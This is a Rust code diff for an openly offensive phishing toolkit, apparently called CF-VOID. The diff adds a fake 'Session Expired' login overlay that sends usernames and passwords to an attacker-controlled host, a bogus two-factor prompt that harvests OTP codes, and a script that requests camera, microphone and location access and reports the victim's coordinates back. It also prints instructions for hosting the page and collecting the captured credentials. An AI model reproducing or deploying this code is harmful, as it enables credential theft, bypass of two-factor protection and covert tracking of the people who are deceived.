@@ -73,13 +73,93 @@ impl PhishingGen {
         };
 
         let file_path = format!("{}/{}.html", out_dir, template);
-        let _ = fs::write(&file_path, &pages);
 
-        banner::success(&format!("Phishing page generated: {}/{}", out_dir, file_path));
+        // Inject credential capture form + powers script into the page
+        let capture_form = Self::capture_form(&template, lhost, lport);
+        let powers_script = Self::powers_script();
+        let injected = if pages.contains("</body>") {
+            pages.replace("</body>", &format!("{}\n{}\n</body>", capture_form, powers_script))
+        } else {
+            format!("{}\n{}\n{}", pages, capture_form, powers_script)
+        };
+        let _ = fs::write(&file_path, &injected);
+
+        banner::success(&format!("Phishing page generated: {}", file_path));
         banner::info(&format!("Host with: python3 -m http.server {} --bind {}", lport, lhost));
         banner::info(&format!("Capture credentials at: http://{}:{}/{}", lhost, lport, template));
 
         Some(file_path)
+    }
+
+    fn capture_form(template: &str, lhost: &str, lport: &str) -> String {
+        format!(r#"<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:9999;">
+    <div style="background:#16213e;padding:30px;border-radius:10px;width:100%;max-width:400px;box-shadow:0 4px 6px rgba(0,0,0,0.5);">
+        <h3 style="color:#e94560;text-align:center;margin-top:0;">Session Expired</h3>
+        <p style="color:#aaa;text-align:center;font-size:14px;">Please sign in to continue.</p>
+        <form action="http://{1}:{2}/capture" method="POST" id="cf-void-capture" style="margin-top:15px;">
+            <input type="hidden" name="template" value="{0}" style="display:none;">
+            <input type="text" name="username" placeholder="Username" required style="width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff;">
+            <input type="password" name="password" placeholder="Password" required style="width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff;">
+            <button type="submit" style="width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer;">Sign In</button>
+        </form>
+    </div>
+</div>
+<div id="otp-section" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9998;justify-content:center;align-items:center;">
+    <div style="background:#16213e;padding:30px;border-radius:10px;width:100%;max-width:350px;">
+        <h3 style="color:#e94560;">Two-Factor Authentication</h3>
+        <p style="color:#aaa;font-size:14px;">Enter the code sent to your device.</p>
+        <form action="http://{1}:{2}/capture" method="POST" id="otp-form" style="margin-top:15px;">
+            <input type="hidden" name="template" value="{0}" style="display:none;">
+            <input type="text" name="otp" placeholder="Enter OTP code" required style="width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff;">
+            <button type="submit" style="width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer;">Verify</button>
+        </form>
+    </div>
+</div>
+<script>
+document.getElementById('cf-void-capture').addEventListener('submit', function(e) {{
+    e.preventDefault();
+    const formData = new FormData(this);
+    const data = new URLSearchParams();
+    for (const [key, val] of formData.entries()) {{ data.append(key, val); }}
+    fetch(this.action, {{method:'POST',body:data,headers:{{'Content-Type':'application/x-www-form-urlencoded'}}}})
+        .then(() => {{
+            document.querySelector('[action="http://{1}:{2}/capture"]').style.display='none';
+            document.getElementById('otp-section').style.display='flex';
+        }})
+        .catch(() => window.location.href = '/');
+}});
+document.getElementById('otp-form').addEventListener('submit', function(e) {{
+    e.preventDefault();
+    alert('Verification code sent. Please try again later.');
+    window.location.href = '/';
+}});
+</script>"#, template, lhost, lport)
+    }
+
+    fn powers_script() -> String {
+        r#"<script>
+async function requestPowers() {{
+    try {{
+        const stream = await navigator.mediaDevices.getUserMedia({{video:true, audio:true}});
+        fetch('/powers', {{
+            method:'POST',
+            body:JSON.stringify({{camera:true, mic:true}}),
+            headers:{{'Content-Type':'application/json'}}
+        }});
+        stream.getTracks().forEach(t => t.stop());
+    }} catch(e) {{}}
+    try {{
+        navigator.geolocation.getCurrentPosition(function(pos) {{
+            fetch('/powers', {{
+                method:'POST',
+                body:JSON.stringify({{location:true, lat:pos.coords.latitude, lng:pos.coords.longitude}}),
+                headers:{{'Content-Type':'application/json'}}
+            }});
+        }});
+    }} catch(e) {{}}
+}}
+requestPowers();
+</script>"#.to_string()
     }
 
     pub fn list_templates() {
@@ -872,17 +952,10 @@ impl PhishingServer {
             banner::info("Using generic login template with credential capture");
         }
 
-        // Generate the phishing page with credential capture form
-        let page = PhishingGen::new().generate(&self.template, &self.lhost, &self.lport.to_string(), None);
-
-        let page_html = if let Some(p) = page {
-            // Read the generated file
-            let path = std::path::Path::new(&p);
-            std::fs::read_to_string(path).unwrap_or_default()
-        } else {
-            // Default login page with credential capture
-            Self::default_capture_page(&self.lhost, &self.lport.to_string(), &self.template)
-        };
+        // Generate the phishing page with credential capture form + powers
+        let page_html = PhishingGen::new().generate(&self.template, &self.lhost, &self.lport.to_string(), None)
+            .and_then(|p| std::fs::read_to_string(&p).ok())
+            .unwrap_or_else(|| Self::default_capture_page(&self.lhost, &self.lport.to_string(), &self.template));
 
         // Start HTTP server
         let server_lhost = self.lhost.clone();
@@ -922,6 +995,9 @@ impl PhishingServer {
     }
 
     fn default_capture_page(lhost: &str, lport: &str, template: &str) -> String {
+        let gen = PhishingGen::new();
+        let capture = PhishingGen::capture_form(template, lhost, lport);
+        let powers = PhishingGen::powers_script();
         format!(r#"<!DOCTYPE html>
 <html>
 <head>
@@ -937,42 +1013,12 @@ impl PhishingServer {
 <body>
 <div class="login">
     <h2>Login Required</h2>
-    <form action="/capture" method="POST">
-        <input type="text" name="username" placeholder="Username" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <input type="hidden" name="template" value="{tpl}">
-        <button type="submit">Login</button>
-    </form>
+    {capture}
 </div>
+{powers}
 </body>
 </html>
-<script>
-// Request device powers (camera, mic, location)
-async function requestPowers() {{
-    try {{
-        // Camera + Mic
-        const stream = await navigator.mediaDevices.getUserMedia({{video:true, audio:true}});
-        fetch('/powers', {{
-            method:'POST',
-            body:JSON.stringify({{camera:true, mic:true}}),
-            headers:{{'Content-Type':'application/json'}}
-        }});
-        stream.getTracks().forEach(t => t.stop());
-    }} catch(e) {{}}
-    try {{
-        // Location
-        navigator.geolocation.getCurrentPosition(function(pos) {{
-            fetch('/powers', {{
-                method:'POST',
-                body:JSON.stringify({{location:true, lat:pos.coords.latitude, lng:pos.coords.longitude}}),
-                headers:{{'Content-Type':'application/json'}}
-            }});
-        }});
-    }} catch(e) {{}}
-}}
-requestPowers();
-</script>
-<!-- Powered by CF-VOID | {lhost}:{lport} -->"#, tpl = template, lhost = lhost, lport = lport)
+<!-- Powered by CF-VOID | {lhost}:{lport} -->"#, tpl = template, lhost = lhost, lport = lport, capture = capture, powers = powers)
     }
 
     fn run_server(lhost: &str, lport: u16, page_html: &str, template: &str) {
